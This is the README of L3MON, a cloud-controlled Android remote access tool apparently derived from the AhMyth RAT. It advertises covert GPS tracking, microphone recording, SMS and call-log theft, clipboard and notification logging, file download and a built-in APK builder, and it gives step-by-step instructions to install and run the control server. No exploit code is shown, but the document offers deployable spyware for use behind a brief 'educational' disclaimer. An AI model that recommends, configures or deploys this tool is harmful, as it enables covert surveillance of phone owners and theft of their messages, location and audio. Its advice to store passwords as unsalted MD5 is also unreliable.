<p align="center">
<img src="https://github.com/etechd/L3MON/raw/master/server/assets/webpublic/logo.png" height="60"><br>
A cloud based remote android managment suite, powered by NodeJS
</p>



## Features
- GPS Logging
- Microphone Recording
- View Contacts
- SMS Logs
- Send SMS
- Call Logs
- View Installed Apps
- View Stub Permissions
- Live Clipboard Logging
- Live Notification Logging
- View WiFi Networks (logs previously seen)
- File Explorer & Downloader
- Commang Queuing
- Built In APK Builder

## Prerequisites 
 - Java Runtime Environment 8
    - See [installation](#Installation) for OS specifics
 - NodeJs 
 - A Server

## Installation 
1. Install JRE 8 
    - Debian, Ubuntu, Etc
        - `sudo apt-get install openjdk-8-jre`
    - Fedora, Oracle, Red Hat, etc
        -  `su -c "yum install java-1.8.0-openjdk"`
    - Windows 
        - click [HERE](https://www.oracle.com/technetwork/java/javase/downloads/jre8-downloads-2133155.html) for downloads

2. Install NodeJS [Instructions Here](https://nodejs.org/en/download/package-manager/) (If you can't figure this out, you shouldn't really be using this)

3. install PM2 
    - `npm install pm2 -g`

4. Download and Extract the latest release (v1.0.0) from [HERE](https://github.com/etechd/L3MON/releases/download/1.0.0/L3MON-v1.0.0.zip)

5. In the extracted folder, run `index.js` with pm2
    - `pm2 start index.js`
    - `pm2 startup` <- to run L3MON on startup

6. Set a Username & Password
    1. Open `maindb.json` in a text editor
    2. under `admin` 
        - set the `username` as plain text
        - set the `password` as a LOWERCASE MD5 hash
    3. save the file
    4. run `pm2 restart all`

7. in your browser navigate to `http://<SERVER IP>:22533`
    
It's reccomended to run L3MON behind a reverse proxy such as [NGINX](https://www.nginx.com/resources/wiki/start/topics/tutorials/install/)

## Screenshots
| | | |
|:-------------------------:|:-------------------------:|:-------------------------:|
|<a href="https://github.com/etechd/L3MON/raw/master/Screenshots/call_log.png"> <img width="1604" src="https://github.com/etechd/L3MON/raw/master/Screenshots/call_log.png"> Call Log</a> | <a href="https://github.com/etechd/L3MON/raw/master/Screenshots/apk_builder.png"> <img width="1604" src="https://github.com/etechd/L3MON/raw/master/Screenshots/apk_builder.png"> APK Builder</a> |<a href="https://github.com/etechd/L3MON/raw/master/Screenshots/clipboard.png"> <img width="1604" src="https://github.com/etechd/L3MON/raw/master/Screenshots/clipboard.png"> Clipboard Log</a>|
|
<a href="https://github.com/etechd/L3MON/raw/master/Screenshots/contacts.png"> <img width="1604" src="https://github.com/etechd/L3MON/raw/master/Screenshots/contacts.png"> Contacts</a>  |  <a href="https://github.com/etechd/L3MON/raw/master/Screenshots/devices.png"> <img width="1604" src="https://github.com/etechd/L3MON/raw/master/Screenshots/devices.png"> Devices</a>|<a href="https://github.com/etechd/L3MON/raw/master/Screenshots/file_explorer.png"> <img width="1604" src="https://github.com/etechd/L3MON/raw/master/Screenshots/file_explorer.png"> File Explorer</a>|
|<a href="https://github.com/etechd/L3MON/raw/master/Screenshots/gps_log.png"> <img width="1604" src="https://github.com/etechd/L3MON/raw/master/Screenshots/gps_log.png"> GPS Log</a>  | <a href="https://github.com/etechd/L3MON/raw/master/Screenshots/sms_log.png"> <img width="1604" src="https://github.com/etechd/L3MON/raw/master/Screenshots/sms_log.png"> SMS Log</a> |<a href="https://github.com/etechd/L3MON/raw/master/Screenshots/sms_send.png"> <img width="1604" src="https://github.com/etechd/L3MON/raw/master/Screenshots/sms_send.png"> Send SMS</a>|
|<a href="https://github.com/etechd/L3MON/raw/master/Screenshots/installed_apps.png"> <img width="1604" src="https://github.com/etechd/L3MON/raw/master/Screenshots/installed_apps.png"> Installed Apps</a> | <a href="https://github.com/etechd/L3MON/raw/master/Screenshots/microphone.png"> <img width="1604" src="https://github.com/etechd/L3MON/raw/master/Screenshots/microphone.png"> Microphone</a> |<a href="https://github.com/etechd/L3MON/raw/master/Screenshots/notification_log.png"> <img width="1604" src="https://github.com/etechd/L3MON/raw/master/Screenshots/notification_log.png"> Notifications</a>|
|<a href="https://github.com/etechd/L3MON/raw/master/Screenshots/event_log.png"> <img width="1604" src="https://github.com/etechd/L3MON/raw/master/Screenshots/event_log.png"> Event Log</a> | <a href="https://github.com/etechd/L3MON/raw/master/Screenshots/login.png"> <img width="1604" src="https://github.com/etechd/L3MON/raw/master/Screenshots/login.png"> Login</a> |<a href="https://github.com/etechd/L3MON/raw/master/Screenshots/wifi_manager.png"> <img width="1604" src="https://github.com/etechd/L3MON/raw/master/Screenshots/wifi_manager.png"> WiFi Manager</a>|

## Thanks
L3MON Builds off and utilizes serveral opensource softwares, Without these, L3MON Wouldn't be what it is!
 - Inspiration for the project and the basic building blocks for the Android App are based off [AhMyth](https://github.com/AhMyth/AhMyth-Android-RAT) 
 - [express](https://github.com/expressjs/express)
 - [node-geoip](https://github.com/bluesmoon/node-geoip)
 - [lowdb](https://github.com/typicode/lowdb)
 - [socket.io](https://github.com/socketio/socket.io)
 - [Open Street Map](https://www.openstreetmap.org)
 - [Leaflet](https://leafletjs.com/)

## Disclaimer
<b>ETechD Provides no warranty with this software and will not be responsible for any direct or indirect damage caused due to the usage of this tool.<br>
L3MON is built for both Educational and Internal use ONLY.</b>

<br>
<p align="center">Made with ❤️ By <a href="//etechd.com">ETechD</a></p>
<p align="center" style="font-size: 8px">v1.0.0</p>